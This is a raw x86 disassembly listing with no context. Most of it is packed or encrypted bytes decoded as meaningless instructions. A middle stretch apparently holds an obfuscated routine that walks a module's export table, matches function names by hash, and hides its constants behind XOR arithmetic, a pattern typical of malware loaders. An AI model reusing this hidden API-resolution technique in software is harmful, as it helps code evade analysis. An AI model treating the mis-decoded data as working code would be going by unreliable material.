  406359:	ss mov cl,0xfa
  40635c:	sbb    al,0x5e
  40635e:	xor    eax,0x34c03ea5
  406363:	push   ds
  406364:	std    
  406365:	in     eax,dx
  406366:	cmp    ah,BYTE PTR [edx-0x1a]
  406369:	jg     0x4063ce
  40636b:	mov    DWORD PTR [ebp+ebx*4+0x4887c56f],ecx
  406372:	icebp  
  406373:	or     eax,eax
  406375:	adc    al,0xf1
  406377:	retf   0x950d
  40637a:	pop    esp
  40637b:	pop    eax
  40637c:	sub    dl,BYTE PTR [ebp-0x25]
  40637f:	mov    ebx,0x539d4cdf
  406384:	and    al,bl
  406386:	jg     0x4063bc
  406388:	rcl    DWORD PTR [edx],0x88
  40638b:	mov    ch,0xa3
  40638d:	pop    ecx
  40638e:	jge    0x4063dc
  406390:	fmul   QWORD PTR [edx-0x54048e24]
  406396:	arpl   bp,cx
  406398:	repnz push cs
  40639a:	pop    ss
  40639b:	cwde   
  40639c:	imul   esi
  40639e:	mov    dl,BYTE PTR [edi]
  4063a0:	mov    ds:0xa07d95cf,al
  4063a5:	repnz or eax,0x1bdad3c0
  4063ab:	rcl    DWORD PTR [ebx],1
  4063ad:	(bad)  
  4063af:	and    edx,edi
  4063b1:	dec    eax
  4063b2:	add    ecx,DWORD PTR [edi]
  4063b4:	and    DWORD PTR [ebx],ebp
  4063b6:	sbb    ecx,edx
  4063b8:	pop    ds
  4063b9:	jmp    0x1026726e
  4063be:	aam    0xf8
  4063c0:	mov    al,0xe9
  4063c2:	fisttp QWORD PTR [edx-0x4fd5958a]
  4063c8:	(bad)  
  4063c9:	call   0xc92610ac
  4063ce:	rcr    BYTE PTR [ebx],cl
  4063d0:	dec    edi
  4063d1:	xchg   ebx,eax
  4063d2:	xchg   dh,bl
  4063d4:	mov    dl,0x1e
  4063d6:	add    bh,BYTE PTR [eax+0x7b40ee23]
  4063dc:	bound  ecx,QWORD PTR [ebp+0x618244b2]
  4063e2:	add    bh,dl
  4063e4:	loopne 0x40644d
  4063e6:	sbb    DWORD PTR [ebp+0x7a],0xa4c6be96
  4063ed:	jae    0x4063e5
  4063ef:	push   esi
  4063f0:	pushf  
  4063f1:	push   ds
  4063f2:	and    al,0x77
  4063f4:	imul   esp,DWORD PTR [edx+0x755a8249],0xffffffd7
  4063fb:	push   ebx
  4063fc:	dec    edi
  4063fd:	push   0xffffffb7
  4063ff:	mov    eax,0x864fc5ff
  406404:	sbb    al,0xc5
  406406:	retf   0x560a
  406409:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40640a:	fisttp QWORD PTR [edx+edi*8]
  40640d:	iret   
  40640e:	cdq    
  40640f:	ja     0x40647c
  406411:	mov    edi,?
  406413:	loope  0x4063a8
  406415:	adc    al,0x70
  406417:	jae    0x4063f9
  406419:	xchg   esi,eax
  40641a:	mov    ebx,0xe8ce1d16
  40641f:	sbb    cl,dl
  406421:	mov    ah,0x35
  406423:	mov    esi,0x5d464192
  406428:	es jb  0x4063fc
  40642b:	mov    ebx,0x6b297560
  406430:	add    al,0xb0
  406432:	mov    al,ds:0x5f1ed848
  406437:	dec    eax
  406438:	xchg   BYTE PTR [eax+0x52],dh
  40643b:	sahf   
  40643c:	push   ebx
  40643d:	xchg   esi,eax
  40643e:	(bad)  
  40643f:	push   eax
  406440:	mov    WORD PTR [ebp+0x7334710],fs
  406446:	sub    BYTE PTR [edx],dl
  406448:	jns    0x4064c9
  40644a:	aaa    
  40644b:	and    eax,0x937c33e8
  406450:	je     0x4063f0
  406452:	push   ds
  406453:	jl     0x406420
  406455:	mov    edx,0x58e8d75b
  40645a:	dec    ecx
  40645b:	mov    dh,0x57
  40645d:	or     ch,BYTE PTR [esi+0x2b42bf37]
  406463:	pop    eax
  406464:	nop
  406465:	jmp    0x406430
  406467:	pop    ecx
  406468:	add    eax,DWORD PTR [eax-0xd168bbb]
  40646e:	pop    edi
  40646f:	enter  0x6a9a,0xcf
  406473:	rcr    BYTE PTR [edx+0x2461768e],0xaf
  40647a:	mov    ds,WORD PTR [ebx]
  40647c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40647d:	jle    0x4064bf
  40647f:	cld    
  406480:	mov    edi,0x10827555
  406485:	fcomp  QWORD PTR [ecx+0x65]
  406488:	imul   ebx,DWORD PTR [eax-0x66473109],0xf7f5baf
  406492:	icebp  
  406493:	sbb    eax,esp
  406495:	jle    0x4064b6
  406497:	xor    esi,0xffffffd0
  40649a:	or     edx,DWORD PTR [edi*8+0x30ab63ac]
  4064a1:	or     BYTE PTR ds:0x1e0ed0fe,bh
  4064a7:	inc    eax
  4064a8:	jo     0x4064e5
  4064aa:	fnstenv ds:0x69fdbd6a
  4064b0:	xchg   ebx,eax
  4064b1:	or     eax,DWORD PTR [eax-0x3601e41d]
  4064b7:	dec    esi
  4064b8:	lods   al,BYTE PTR ds:[esi]
  4064b9:	ss push es
  4064bb:	rol    DWORD PTR ds:0x5bf6d7e7,0x99
  4064c2:	xor    eax,0x3a24b24f
  4064c7:	jg     0x40645d
  4064c9:	call   0xc1a7:0xb8571a6c
  4064d0:	fisttp DWORD PTR es:[edi-0x37d1c251]
  4064d7:	xor    ebx,ecx
  4064d9:	xchg   edi,eax
  4064da:	lea    ebp,[esi-0xb828122]
  4064e0:	out    0xca,eax
  4064e2:	pop    ss
  4064e3:	pop    esi
  4064e4:	dec    edi
  4064e5:	xor    BYTE PTR [esi-0x47],al
  4064e8:	mov    esi,0xc181f881
  4064ed:	outs   dx,DWORD PTR ds:[esi]
  4064ee:	xchg   ebx,eax
  4064ef:	out    0xb7,eax
  4064f1:	xchg   BYTE PTR ds:0x685857f6,al
  4064f7:	ja     0x40655f
  4064f9:	std    
  4064fa:	test   DWORD PTR [ecx-0x23],edi
  4064fd:	mov    cl,0xfc
  4064ff:	mov    ds:0xf4737d38,eax
  406504:	dec    esi
  406505:	fwait
  406506:	jae    0x4064d3
  406508:	mov    esp,0xf85d4ec4
  40650d:	mov    cs,WORD PTR ds:0x56d45f5a
  406513:	pop    ebp
  406514:	sahf   
  406515:	mov    eax,0x7a5661ca
  40651a:	dec    esp
  40651b:	sub    eax,0xbcbb04fa
  406520:	ret    
  406521:	push   cs
  406522:	xchg   edx,eax
  406523:	or     cl,ah
  406525:	in     al,dx
  406526:	push   cs
  406527:	pop    edx
  406528:	fsubr  DWORD PTR [esi-0x58]
  40652b:	pop    ds
  40652c:	pop    eax
  40652d:	jae    0x406574
  40652f:	mul    bh
  406531:	pusha  
  406532:	pop    es
  406533:	push   ebp
  406534:	rcl    DWORD PTR [ecx+0x21],0x23
  406538:	push   cs
  406539:	outs   dx,DWORD PTR ds:[esi]
  40653a:	scas   al,BYTE PTR es:[edi]
  40653b:	mov    esi,0x731fd2c3
  406540:	scas   eax,DWORD PTR es:[edi]
  406541:	or     al,0x87
  406543:	cmp    BYTE PTR gs:[eax-0x67],bh
  406547:	ret    
  406548:	mov    ds:0xd71ac393,eax
  40654d:	imul   DWORD PTR [ebx+eiz*1-0x3e]
  406551:	inc    edx
  406552:	push   ebp
  406553:	sbb    dh,BYTE PTR [edi]
  406555:	pop    esi
  406556:	push   0xbe81a75c
  40655b:	ss push 0x3f3bac59
  406561:	lods   al,BYTE PTR ds:[esi]
  406562:	loopne 0x406513
  406564:	xor    al,0x81
  406566:	mov    cl,0xdb
  406568:	repnz adc eax,0xb3e12e34
  40656e:	pusha  
  40656f:	mov    ecx,0x7708bce6
  406574:	gs mov ebx,0x55c5d8dd
  40657a:	push   ecx
  40657b:	jmp    0xab3:0x2849ffb0
  406582:	lahf   
  406583:	xchg   esi,eax
  406584:	leave  
  406585:	cwde   
  406586:	cmp    bl,bh
  406588:	sbb    al,0x71
  40658a:	jl     0x4065fd
  40658c:	jecxz  0x406561
  40658e:	xchg   ebp,eax
  40658f:	cld    
  406590:	pop    edi
  406591:	leave  
  406592:	call   DWORD PTR [edx]
  406594:	add    esi,DWORD PTR [ecx]
  406596:	(bad)  
  406598:	adc    bl,BYTE PTR gs:[ebp+0x5e]
  40659c:	and    al,0xa2
  40659e:	ficom  DWORD PTR [edx]
  4065a0:	or     al,0x6b
  4065a2:	mov    ebx,0xf346ea60
  4065a7:	and    BYTE PTR [edx],dh
  4065a9:	fcom   QWORD PTR [edi]
  4065ab:	out    0xf0,eax
  4065ad:	iret   
  4065ae:	sahf   
  4065af:	inc    esi
  4065b0:	sbb    cl,BYTE PTR [edx-0x3]
  4065b3:	and    ecx,DWORD PTR [edi]
  4065b5:	pusha  
  4065b6:	mov    ah,0xf3
  4065b8:	jmp    0xef38:0xa428b795
  4065bf:	xchg   edi,eax
  4065c0:	fs mov dl,0x3a
  4065c3:	imul   esi,DWORD PTR [esi+0x60],0x92dd9347
  4065ca:	jmp    0x406550
  4065cc:	add    ecx,DWORD PTR [esi+0x51]
  4065cf:	(bad)  
  4065d1:	test   DWORD PTR [esi+0x79],0xff3680a4
  4065d8:	fisubr DWORD PTR [ecx]
  4065da:	add    eax,DWORD PTR [esi]
  4065dc:	js     0x40656c
  4065de:	push   esp
  4065df:	mov    dl,0x66
  4065e1:	lock push ecx
  4065e3:	inc    eax
  4065e4:	xor    eax,0xa4c7fcea
  4065e9:	lea    edx,[esi-0x3272db]
  4065ef:	sbb    DWORD PTR ds:0x430000,0x43300c
  4065f9:	xor    ecx,ebx
  4065fb:	xor    DWORD PTR ds:0x42f008,0xe68
  406605:	xor    edx,ebx
  406607:	mov    DWORD PTR ds:0x431008,0xa36
  406611:	cmp    edx,ecx
  406613:	mov    DWORD PTR ds:0x42f000,0x1171
  40661d:	je     0x40684c
  406623:	mov    ecx,DWORD PTR [ebp-0x4]
  406626:	xor    ecx,ebx
  406628:	adc    DWORD PTR ds:0x431000,0x2a26
  406632:	add    ecx,eax
  406634:	cmp    esi,ecx
  406636:	jne    0x4067ef
  40663c:	push   DWORD PTR [ebp+0x8]
  40663f:	call   0x415b52
  406644:	mov    ecx,DWORD PTR ds:0x41e0dc
  40664a:	mov    ecx,DWORD PTR [ecx]
  40664c:	and    DWORD PTR ds:0x43300c,ecx
  406652:	mov    DWORD PTR [ebp-0x18],eax
  406655:	mov    eax,DWORD PTR [ebp-0x4]
  406658:	mov    DWORD PTR ds:0x432018,0x10
  406662:	cmp    DWORD PTR ds:0x432018,0x0
  406669:	je     0x4066c2
  40666f:	cmp    DWORD PTR ds:0x432018,0x7
  406676:	jne    0x406685
  40667c:	push   DWORD PTR [ebp-0x28]
  40667f:	call   DWORD PTR ds:0x42b004
  406685:	cmp    DWORD PTR ds:0x432018,0x8
  40668c:	jne    0x40669f
  406692:	mov    edi,DWORD PTR ds:0x432018
  406698:	dec    edi
  406699:	mov    DWORD PTR ds:0x432018,edi
  40669f:	mov    edi,DWORD PTR ds:0x432018
  4066a5:	dec    edi
  4066a6:	mov    DWORD PTR ds:0x432018,edi
  4066ac:	jmp    0x406662
  4066b1:	mov    ecx,DWORD PTR ds:0x42473f
  4066b7:	mov    edi,DWORD PTR ds:0x41e0a4
  4066bd:	sub    edi,ecx
  4066bf:	add    ecx,DWORD PTR [ecx+edi*1]
  4066c2:	mov    ecx,DWORD PTR [ebp-0x18]
  4066c5:	xor    eax,ebx
  4066c7:	mov    edi,0x3272db
  4066cc:	add    eax,edi
  4066ce:	mov    DWORD PTR ds:0x42f008,0x2bfa
  4066d8:	cmp    ecx,eax
  4066da:	je     0x4068bc
  4066e0:	sbb    DWORD PTR ds:0x430000,0x430010
  4066ea:	push   DWORD PTR [ebp-0x18]
  4066ed:	push   DWORD PTR [ebp+0x8]
  4066f0:	call   0x417fa0
  4066f5:	sbb    DWORD PTR ds:0x43001c,ecx
  4066fb:	mov    DWORD PTR [ebp-0x18],eax
  4066fe:	dec    eax
  4066ff:	mov    eax,DWORD PTR [ebp-0x4]
  406702:	and    DWORD PTR ds:0x42f018,0x0
  40670c:	jmp    0x40671e
  406711:	mov    ecx,DWORD PTR ds:0x42f018
  406717:	inc    ecx
  406718:	mov    DWORD PTR ds:0x42f018,ecx
  40671e:	cmp    DWORD PTR ds:0x42f018,0x1e
  406725:	jae    0x40674c
  40672b:	cmp    DWORD PTR ds:0x42f018,0x2e
  406732:	jne    0x406741
  406738:	push   DWORD PTR [ebp-0x20]
  40673b:	call   DWORD PTR ds:0x42b048
  406741:	jmp    0x406711
  406746:	sbb    ecx,DWORD PTR ds:0x43300c
  40674c:	mov    ecx,DWORD PTR [ebp-0x18]
  40674f:	xor    DWORD PTR ds:0x42f000,0x430004
  406759:	xor    eax,ebx
  40675b:	sub    DWORD PTR ds:0x43300c,0x26ad
  406765:	add    eax,edi
  406767:	cmp    ecx,eax
  406769:	mov    DWORD PTR ds:0x42f01c,0x148e
  406773:	je     0x4068bc
  406779:	mov    eax,DWORD PTR [ebp-0x18]
  40677c:	mov    eax,DWORD PTR [eax+0x18]
  40677f:	mov    ecx,DWORD PTR ds:0x42f00c
  406785:	or     DWORD PTR ds:0x432014,ecx
  40678b:	mov    DWORD PTR [ebp-0x24],eax
  40678e:	mov    eax,DWORD PTR [ebp-0x18]
  406791:	mov    ecx,DWORD PTR [ebp+0x8]
  406794:	add    ecx,DWORD PTR [eax+0x20]
  406797:	mov    DWORD PTR [ebp-0x2c],ecx
  40679a:	and    eax,eax
  40679c:	mov    eax,DWORD PTR [ebp-0x18]
  40679f:	and    ecx,DWORD PTR ds:0x431000
  4067a5:	mov    ecx,DWORD PTR [ebp+0x8]
  4067a8:	adc    DWORD PTR ds:0x42f004,0x721
  4067b2:	add    ecx,DWORD PTR [eax+0x24]
  4067b5:	movzx  eax,WORD PTR ds:0x432004
  4067bc:	sbb    eax,DWORD PTR ds:0x43201c
  4067c2:	mov    ds:0x432004,eax
  4067c7:	mov    DWORD PTR [ebp-0x34],ecx
  4067ca:	or     DWORD PTR ds:0x433008,edx
  4067d0:	mov    eax,DWORD PTR [ebp-0x18]
  4067d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4067d6:	sbb    DWORD PTR ds:0x431018,0x431008
  4067e0:	add    ecx,DWORD PTR [eax+0x1c]
  4067e3:	not    eax
  4067e5:	mov    eax,edi
  4067e7:	mov    DWORD PTR [ebp-0x18],ecx
  4067ea:	jmp    0x406884
  4067ef:	movzx  ecx,BYTE PTR ds:0x432010
  4067f6:	add    ecx,DWORD PTR ds:0x43100c
  4067fc:	mov    DWORD PTR ds:0x432010,ecx
  406802:	mov    ecx,DWORD PTR [ebp-0x2c]
  406805:	xor    DWORD PTR ds:0x42f004,edi
  40680b:	mov    edx,DWORD PTR [ebp+0x8]
  40680e:	and    DWORD PTR ds:0x42f020,0x43301c
  406818:	add    edx,DWORD PTR [ecx+esi*4]
  40681b:	inc    ecx
  40681c:	mov    DWORD PTR [ebp-0x28],edx
  40681f:	sub    DWORD PTR ds:0x42f000,ecx
  406825:	mov    ecx,DWORD PTR [ebp-0x4]
  406828:	sbb    DWORD PTR ds:0x42f00c,0xc10
  406832:	mov    edx,DWORD PTR [ebp-0x28]
  406835:	xor    ecx,ebx
  406837:	dec    DWORD PTR ds:0x43000c
  40683d:	add    ecx,eax
  40683f:	cmp    edx,ecx
  406841:	je     0x406884
  406847:	jmp    0x406870
  40684c:	mov    ecx,DWORD PTR [ebp-0x4]
  40684f:	mov    edx,DWORD PTR [ebp-0x8]
  406852:	xor    ecx,ebx
  406854:	add    ecx,eax
  406856:	cmp    edx,ecx
  406858:	je     0x4068c8
  40685e:	mov    ecx,DWORD PTR [ebp-0x4]
  406861:	mov    edx,DWORD PTR [ebp-0x30]
  406864:	xor    ecx,ebx
  406866:	add    ecx,eax
  406868:	cmp    edx,ecx
  40686a:	je     0x4068d7
  406870:	lea    eax,[ebp-0x8]
  406873:	push   eax
  406874:	push   DWORD PTR [ebp-0x28]
  406877:	push   DWORD PTR [ebp+0xc]
  40687a:	call   0x401000
  40687f:	mov    eax,0x3272db
  406884:	mov    ecx,DWORD PTR [ebp-0x4]
  406887:	mov    edx,DWORD PTR [ebp-0x8]
  40688a:	xor    ecx,ebx
  40688c:	add    ecx,eax
  40688e:	cmp    edx,ecx
  406890:	je     0x4068ab
  406896:	mov    ecx,DWORD PTR [ebp-0x34]
  406899:	movzx  ecx,WORD PTR [ecx+esi*2]
  40689d:	mov    edx,DWORD PTR [ebp-0x18]
  4068a0:	mov    ecx,DWORD PTR [edx+ecx*4]
  4068a3:	mov    DWORD PTR [ebp-0x38],ecx
  4068a6:	jmp    0x40684c
  4068ab:	mov    ecx,DWORD PTR [ebp-0x14]
  4068ae:	xor    ecx,ebx
  4068b0:	lea    esi,[esi+ecx*1+0x3272db]
  4068b7:	jmp    0x40427f
  4068bc:	mov    eax,DWORD PTR [ebp-0x4]
  4068bf:	xor    eax,ebx
  4068c1:	add    eax,edi
  4068c3:	jmp    0x408d90
  4068c8:	mov    eax,DWORD PTR [ebp-0x4]
  4068cb:	xor    eax,ebx
  4068cd:	add    eax,0x3272db
  4068d2:	jmp    0x408d90
  4068d7:	mov    ecx,DWORD PTR [ebp-0x38]
  4068da:	add    ecx,DWORD PTR [ebp+0x8]
  4068dd:	mov    DWORD PTR [ebp-0x10],ecx
  4068e0:	mov    ecx,DWORD PTR [ebp-0x1c]
  4068e3:	test   ecx,ecx
  4068e5:	je     0x408d1b
  4068eb:	mov    DWORD PTR [ebp-0x20],0x0
  4068f2:	push   0x3
  4068f4:	xor    edx,edx
  4068f6:	pop    edx
  4068f7:	add    edx,0x8
  4068fa:	push   edx
  4068fb:	pop    ecx
  4068fc:	push   0x6
  4068fe:	dec    ecx
  4068ff:	pop    ebx
  406900:	dec    ebx
  406901:	xchg   ebx,ecx
  406903:	sub    ebx,ecx
  406905:	xchg   ebx,ecx
  406907:	dec    ecx
  406908:	mov    eax,DWORD PTR [ebp-0x1c]
  40690b:	imul   eax,ecx
  40690e:	sub    esp,eax
  406910:	mov    DWORD PTR [ebp-0x20],esp
  406913:	mov    eax,DWORD PTR [ebp-0x4]
  406916:	mov    ecx,0x7510893
  40691b:	xor    eax,ecx
  40691d:	mov    edx,0x3272db
  406922:	add    eax,edx
  406924:	mov    DWORD PTR [ebp+0x8],eax
  406927:	mov    eax,DWORD PTR [ebp-0x14]
  40692a:	xor    eax,ecx
  40692c:	add    eax,edx
  40692e:	mov    edx,DWORD PTR [ebp+0x14]
  406931:	imul   eax,DWORD PTR [edx]
  406934:	mov    edx,DWORD PTR [ebp-0x4]
  406937:	xor    edx,ecx
  406939:	mov    ecx,DWORD PTR [ebp+0x8]
  40693c:	lea    ecx,[edx+ecx*1+0x3272db]
  406943:	cmp    ecx,eax
  406945:	je     0x408d11
  40694b:	mov    edi,DWORD PTR [ebp-0x14]
  40694e:	mov    eax,DWORD PTR [ebp+0x8]
  406951:	mov    edx,DWORD PTR [ebp+0x14]
  406954:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  406958:	mov    ecx,0x7510893
  40695d:	xor    edx,edx
  40695f:	xor    edi,ecx
  406961:	mov    esi,0x3272db
  406966:	add    edi,esi
  406968:	div    edi
  40696a:	mov    edx,DWORD PTR [ebp-0x4]
  40696d:	xor    edx,ecx
  40696f:	lea    eax,[edx+eax*1+0x3272db]
  406976:	mov    edx,DWORD PTR [ebp+0x8]
  406979:	mov    edi,DWORD PTR [ebp-0x20]
  40697c:	mov    DWORD PTR [edi+edx*4],eax
  40697f:	mov    eax,DWORD PTR [ebp-0x14]
  406982:	mov    edx,DWORD PTR [ebp+0x8]
  406985:	xor    eax,ecx
  406987:	lea    eax,[eax+edx*1+0x3272db]
  40698e:	mov    DWORD PTR [ebp+0x8],eax
  406991:	mov    eax,DWORD PTR [ebp-0x14]
  406994:	mov    edx,DWORD PTR [ebp+0x14]
  406997:	xor    eax,ecx
  406999:	add    eax,esi
  40699b:	imul   eax,DWORD PTR [edx]
  40699e:	mov    edx,DWORD PTR [ebp-0x4]
  4069a1:	xor    edx,ecx
  4069a3:	mov    ecx,DWORD PTR [ebp+0x8]
  4069a6:	lea    ecx,[edx+ecx*1+0x3272db]
  4069ad:	cmp    ecx,eax
  4069af:	jmp    0x408d04
  4069b4:	into   
  4069b5:	mov    BYTE PTR [ecx],bl
  4069b7:	(bad)  
  4069b8:	adc    esp,DWORD PTR [ebx+0x10b2688d]
  4069be:	shl    DWORD PTR [ebx+0x3e],0x44
  4069c2:	test   BYTE PTR ds:0x62623cc2,0x2a
  4069c9:	pop    edi
  4069ca:	bound  esp,QWORD PTR [edx+0x48]
  4069cd:	jnp    0x406a1a
  4069cf:	ret    0x8bf7
  4069d2:	call   0x92b11098
  4069d7:	in     al,dx
  4069d8:	pop    esi
  4069d9:	or     BYTE PTR [ecx],0x44
  4069dc:	fsubr  DWORD PTR [esi-0x7891592f]
  4069e2:	mov    bl,0x34
  4069e4:	and    eax,0x4ac6801
  4069e9:	stc    
  4069ea:	jmp    0xe5e1:0xb80b553e
  4069f1:	aas    
  4069f2:	mov    ds:0xee9f2c82,eax
  4069f7:	(bad)  
  4069f8:	and    edi,DWORD PTR [edi+0x51]
  4069fb:	and    bl,bh
  4069fd:	ds imul ebx,eax,0x6a06792b
  406a04:	mov    ecx,0xe02e7c67
  406a09:	adc    eax,DWORD PTR [edi]
  406a0b:	(bad)  
  406a0c:	neg    DWORD PTR [esi]
  406a0e:	popa   
  406a0f:	out    dx,eax
  406a10:	icebp  
  406a11:	daa    
  406a12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a13:	pop    edx
  406a14:	jg     0x4069e8
  406a16:	sub    ax,0x395e
  406a1a:	in     eax,0x76
  406a1c:	push   edx
  406a1d:	fmul   QWORD PTR [eax-0x4b]
  406a20:	fbstp  TBYTE PTR [eax]
  406a22:	test   BYTE PTR [edi],bl
  406a24:	or     cl,dl
  406a26:	push   edi
  406a27:	sbb    BYTE PTR [ebx+0x6d],0xf3
  406a2b:	mov    ebx,0xd7b581d5
  406a30:	in     al,dx
  406a31:	das    
  406a32:	mov    esi,0x4d43b98e
  406a37:	ja     0x406a82
  406a39:	xor    dl,ch
  406a3b:	ss xchg ebp,eax
  406a3d:	(bad)
  406a40:	addr16 mov al,0xf4
  406a43:	cmp    ecx,0x2a1b87b2
  406a49:	pusha  
  406a4a:	mov    ds:0x8c901da9,eax
  406a4f:	push   ss
  406a50:	xchg   esi,eax
  406a51:	dec    esp
  406a52:	jbe    0x406a16
  406a54:	shr    BYTE PTR [eax-0xa],0xac
  406a58:	or     eax,0x3c25aebc
  406a5d:	sbb    BYTE PTR [eax+0x35ae1754],0x52
  406a64:	xchg   ebx,eax
  406a65:	push   esp
  406a66:	xchg   edx,eax
  406a67:	int    0x6a
  406a69:	pop    es
  406a6a:	es inc ecx
  406a6c:	mov    eax,ds:0x2e8d91c5
  406a71:	xlat   BYTE PTR ds:[ebx]
  406a72:	add    BYTE PTR [edx-0x24],al
  406a75:	rcl    ah,1
  406a77:	nop
  406a78:	hlt    
  406a79:	add    esp,DWORD PTR [ebx+0x259cb66c]
  406a7f:	fistp  DWORD PTR [edi-0x69]
  406a82:	jp     0x406a39
  406a84:	jnp    0x406a11
  406a86:	xor    eax,0x47bac92f
  406a8b:	add    BYTE PTR [esi],bh
  406a8d:	xchg   ebx,eax
  406a8e:	inc    ebp
  406a8f:	push   cs
  406a90:	dec    edx
  406a91:	aam    0xe2
  406a93:	mov    ds:0x47a3a80a,al
  406a98:	adc    BYTE PTR [edx+0x26a5e159],ch
  406a9e:	loopne 0x406a5e
  406aa0:	rcr    ecx,1
  406aa2:	push   ecx
  406aa3:	inc    ebx
  406aa4:	dec    eax
  406aa5:	push   ecx
  406aa6:	lahf   
  406aa7:	cmc    
  406aa8:	push   cs
  406aa9:	push   0x5018f2aa
  406aae:	or     cl,ah
  406ab0:	mov    edi,0x20d72311
  406ab5:	mov    eax,ds:0x92b383a7
  406aba:	test   BYTE PTR [edi-0x7fa813b7],ah
  406ac0:	sbb    dh,BYTE PTR [esi-0x432e46ac]
  406ac6:	and    BYTE PTR [ebp-0x78],al
  406ac9:	outs   dx,DWORD PTR ds:[esi]
  406aca:	pop    ss
  406acb:	sub    esp,DWORD PTR [edi]
  406acd:	adc    edi,esp
  406acf:	jb     0x406b0a
  406ad1:	lods   al,BYTE PTR gs:[esi]
  406ad3:	jb     0x406ab2
  406ad5:	adc    BYTE PTR [edx-0xa],cl
  406ad8:	test   esi,0x9fef7fbb
  406ade:	fist   WORD PTR [edi+0x2e231745]
  406ae4:	aas    
  406ae5:	stc    
  406ae6:	xor    edi,DWORD PTR [ebx+edx*8-0x201336bc]
  406aed:	(bad)  
  406aee:	and    al,0x4a
  406af0:	fnstsw WORD PTR [eax]
  406af2:	adc    ebx,edx
  406af4:	push   0x31c66736
  406af9:	push   eax
  406afa:	lods   al,BYTE PTR ds:[esi]
  406afb:	les    esp,FWORD PTR [esp+edi*4+0x4c]
  406aff:	cmp    dh,BYTE PTR [ebx-0x10b2208f]
  406b05:	lock or ah,BYTE PTR [ebp-0x123452c4]
  406b0c:	push   0xbabe5c3
  406b11:	ret    0xf473
  406b14:	cmp    al,0x2b
  406b16:	in     eax,dx
  406b17:	push   edi
  406b18:	mov    edi,0x79ea9dd7
  406b1d:	in     al,0x99
  406b1f:	iret   
  406b20:	mov    al,ds:0xc7749cc7
  406b25:	jp     0x406aee
  406b27:	mov    edx,0x599e6e04
  406b2c:	test   eax,0x407b54ab
  406b31:	leave  
  406b32:	sbb    ebx,DWORD PTR [esp+ebp*8+0x5e451328]
  406b39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b3a:	mov    DWORD PTR [ebx],edi
  406b3c:	lods   eax,DWORD PTR ds:[esi]
  406b3d:	jle    0x406b44
  406b3f:	or     eax,0x8af02e95
  406b44:	cwde   
  406b45:	test   DWORD PTR [esi],edx
  406b47:	dec    ecx
  406b48:	dec    ebx
  406b49:	push   0x5d048bb6
  406b4e:	mov    DWORD PTR [eax],ebx
  406b50:	xor    al,cl
  406b52:	inc    esp
  406b53:	or     eax,0xc63d4cf7
  406b58:	mov    eax,0x8690f544
  406b5d:	lahf   
  406b5e:	popf   
  406b5f:	xor    eax,DWORD PTR [edx]
  406b61:	int    0xc8
  406b63:	add    eax,ebp
  406b65:	mov    al,0xeb
  406b67:	retf   0x99b
  406b6a:	pop    edi
  406b6b:	add    ebx,DWORD PTR [ecx-0x7]
  406b6e:	add    DWORD PTR [ecx-0x71a7e064],ecx
  406b74:	inc    edx
  406b75:	es icebp 
  406b77:	les    eax,FWORD PTR [ebx+0x64e1d7c5]
  406b7d:	in     al,0xce
  406b7f:	push   ebp
  406b80:	inc    esi
  406b81:	pop    es
  406b82:	sub    BYTE PTR [edx],ah
  406b84:	pop    ecx
  406b85:	lods   eax,DWORD PTR ds:[esi]
  406b86:	push   edx
  406b87:	mov    dh,0x76
  406b89:	pop    eax
  406b8a:	mov    dl,0xb4
  406b8c:	push   ss
  406b8d:	arpl   WORD PTR [esp+esi*8+0x31d19ced],si
  406b94:	mov    bl,0x3a
  406b96:	mov    eax,ds:0xc3284fba
  406b9b:	add    DWORD PTR [edx+ebp*4],0xce209f7b
  406ba2:	(bad)
  406ba5:	sahf   
  406ba6:	scas   al,BYTE PTR es:[edi]
  406ba7:	out    0xe6,al
  406ba9:	in     al,dx
  406baa:	aad    0x7a
  406bac:	repz out dx,eax
  406bae:	test   DWORD PTR [ebx-0x4d],ecx
  406bb1:	dec    ebp
  406bb2:	xchg   esi,eax
  406bb3:	or     DWORD PTR [edx+0x4d5e2bc2],0xb3143034
  406bbd:	sti    
  406bbe:	cmp    eax,0x97b75e2b
  406bc3:	ror    DWORD PTR [edi+eax*8],1
  406bc6:	scas   al,BYTE PTR es:[edi]
  406bc7:	stos   BYTE PTR es:[edi],al
  406bc8:	data16 xor bh,dh
  406bcb:	not    BYTE PTR [ebx]
  406bcd:	sbb    al,0xe2
  406bcf:	loopne 0x406bd7
  406bd1:	cmp    al,0xe9
  406bd3:	out    0x57,eax
  406bd5:	adc    eax,DWORD PTR [edx-0x5]
  406bd8:	mov    dh,0xb0
  406bda:	in     al,0x21
  406bdc:	jl     0x406c35
  406bde:	sbb    DWORD PTR [ebp+0x3a],0xc0d6b8f3
  406be5:	das    
  406be6:	xchg   esi,eax
  406be7:	gs pop ds
  406be9:	(bad)  
  406beb:	(bad)  
  406bec:	in     al,0x2
  406bee:	(bad)  
  406bef:	add    eax,0xf680dc7c
  406bf4:	or     ah,BYTE PTR [esi]
  406bf6:	addr16 cli 
  406bf8:	scas   eax,DWORD PTR es:[edi]
  406bf9:	lahf   
  406bfa:	test   BYTE PTR [edx-0x48],bl
  406bfd:	(bad)  
  406bfe:	in     eax,dx
  406bff:	add    DWORD PTR [edx],0x1f
  406c02:	push   esp
  406c03:	popf   
  406c04:	out    dx,eax
  406c05:	mov    esi,DWORD PTR [edx]
  406c07:	leave  
  406c08:	sahf   
  406c09:	or     al,0x78
  406c0b:	shr    BYTE PTR [edi+0xe],0xa0
  406c0f:	xchg   esp,eax
  406c10:	(bad)  
  406c11:	push   ecx
  406c12:	jnp    0x406c50
  406c14:	in     al,0xa7
  406c16:	cmp    BYTE PTR [edi+eiz*2-0x6f7bca39],bl
  406c1d:	mov    eax,ds:0x23659df3
  406c22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c23:	dec    eax
  406c24:	inc    esi
  406c25:	sbb    al,0x32
  406c27:	or     BYTE PTR [eax],al
  406c29:	xlat   BYTE PTR ds:[ebx]
  406c2a:	mov    cs,ebp
  406c2c:	sub    ecx,DWORD PTR [edi+0x71f263ca]
  406c32:	(bad)  
  406c33:	fist   WORD PTR [esi]
  406c35:	ficom  DWORD PTR [eax-0x668d3bf]
  406c3b:	push   ecx
  406c3c:	test   al,0x4b
  406c3e:	test   al,0xe5
